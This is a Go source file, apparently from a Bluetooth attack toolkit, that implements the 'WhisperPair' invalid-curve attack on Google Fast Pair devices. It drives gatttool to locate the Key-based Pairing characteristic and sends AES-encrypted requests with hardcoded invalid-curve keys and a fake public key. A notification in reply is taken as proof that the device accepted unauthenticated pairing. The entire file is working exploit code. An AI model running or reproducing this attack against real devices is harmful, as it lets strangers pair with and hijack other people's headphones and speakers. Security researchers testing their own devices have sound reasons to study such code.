package bluetooth

import (
	"context"
	"crypto/aes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// Fast Pair Key-based Pairing characteristic (old 16-bit form is also seen).
var fastPairPairingUUIDs = []string{"fe2c1234", "00001234"}

// Invalid-curve candidate values from the small-order point used by
// WhisperPair. These are SHA256(X)[:16] for the five point multiples; only two
// distinct X coordinates exist for this point.
var whisperPairKeys = []string{
	"681a7701cb5e34f1d0fcd77dedd492d0",
	"cb140969afab98eb5daa91de50044378",
}

const (
	whisperPairFakeX = "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f"
	whisperPairFakeY = "4a2e0ded57a5156bb82eb4314c37fd4155395a7e51988af289cce531b9c17192"
)

// runFastPairInvalidCurve performs the WhisperPair invalid-curve attack using
// gatttool. It does not need Google's per-model anti-spoofing public key.
func runFastPairInvalidCurve(ctx context.Context, req AttackRequest, onLine func(string)) error {
	say := func(format string, args ...any) {
		if onLine != nil {
			onLine(fmt.Sprintf(format, args...))
		}
	}
	if _, err := exec.LookPath("gatttool"); err != nil {
		return err
	}
	addrType := strings.ToLower(strings.TrimSpace(req.AddrType))
	if addrType != "random" {
		addrType = "public"
	}
	addr := NormalizeAddr(req.Address)
	say("WhisperPair: %s (%s)", addr, addrType)

	chars, err := gatttoolOutput(ctx, addr, addrType, "--characteristics")
	if err != nil && strings.TrimSpace(chars) == "" {
		return fmt.Errorf("gatttool characteristics: %w", err)
	}
	handle := parseFastPairPairingHandle(chars)
	if handle == "" {
		return fmt.Errorf("Fast Pair Key-based Pairing characteristic not found")
	}
	say("Key-based Pairing handle %s", handle)

	raw, err := fastPairRawRequest(addr)
	if err != nil {
		return err
	}
	fakePub, err := hex.DecodeString(whisperPairFakeX + whisperPairFakeY)
	if err != nil {
		return err
	}

	for i, keyHex := range whisperPairKeys {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		key, _ := hex.DecodeString(keyHex)
		cipherText := aesECBEncrypt(key, raw)
		payload := append(cipherText, fakePub...)
		say("Trying invalid-curve key %d/%d", i+1, len(whisperPairKeys))
		out, err := gatttoolOutput(ctx, addr, addrType,
			"--char-write-req", "-a", handle, "-n", hex.EncodeToString(payload), "--listen")
		if fastPairNotified(out) {
			say("Notification received: device accepted key-based pairing")
			say("WhisperPair invalid-curve vulnerability confirmed.")
			return nil
		}
		if err != nil && ctx.Err() != nil {
			return ctx.Err()
		}
	}
	say("No notification received; device did not accept the invalid-curve request.")
	return nil
}

func gatttoolOutput(ctx context.Context, addr, addrType string, args ...string) (string, error) {
	cctx, cancel := context.WithTimeout(ctx, 6*time.Second)
	defer cancel()
	full := append([]string{"-b", addr, "-t", addrType}, args...)
	out, err := exec.CommandContext(cctx, "gatttool", full...).CombinedOutput()
	text := string(out)
	if cctx.Err() != nil && strings.TrimSpace(text) != "" {
		return text, nil
	}
	return text, err
}

var reGATTChar = regexp.MustCompile(`char value handle:\s*(0x[0-9a-fA-F]+),\s*uuid:\s*([0-9a-fA-F-]+)`)

func parseFastPairPairingHandle(out string) string {
	for _, line := range strings.Split(out, "\n") {
		m := reGATTChar.FindStringSubmatch(line)
		if len(m) != 3 {
			continue
		}
		uuid := strings.ToLower(m[2])
		for _, p := range fastPairPairingUUIDs {
			if strings.HasPrefix(uuid, p) {
				return m[1]
			}
		}
	}
	return ""
}

func fastPairRawRequest(addr string) ([]byte, error) {
	hexAddr := strings.ReplaceAll(addr, ":", "")
	addrBytes, err := hex.DecodeString(hexAddr)
	if err != nil || len(addrBytes) != 6 {
		return nil, fmt.Errorf("invalid address %q", addr)
	}
	nonce := make([]byte, 8)
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	raw := make([]byte, 16)
	raw[0], raw[1] = 0x00, 0x00
	copy(raw[2:8], addrBytes)
	copy(raw[8:16], nonce)
	return raw, nil
}

func aesECBEncrypt(key, plaintext []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	out := make([]byte, len(plaintext))
	for i := 0; i+block.BlockSize() <= len(plaintext); i += block.BlockSize() {
		block.Encrypt(out[i:i+block.BlockSize()], plaintext[i:i+block.BlockSize()])
	}
	return out
}

func fastPairNotified(out string) bool {
	low := strings.ToLower(out)
	return strings.Contains(low, "notification handle =") ||
		strings.Contains(low, "notification:") ||
		strings.Contains(low, "value: 0x")
}

// fastPairInvalidCurveKeys returns the derived keys for tests.
func fastPairInvalidCurveKeys() []string {
	keys := make([]string, 0, len(whisperPairKeys))
	for _, k := range whisperPairKeys {
		if b, err := hex.DecodeString(k); err == nil && len(b) == 16 {
			keys = append(keys, k)
		}
	}
	return keys
}

// parseGATTInt is a small helper used by tests/tools.
func parseGATTInt(s string) int {
	n, _ := strconv.ParseInt(strings.TrimPrefix(strings.ToLower(s), "0x"), 16, 32)
	return int(n)
}
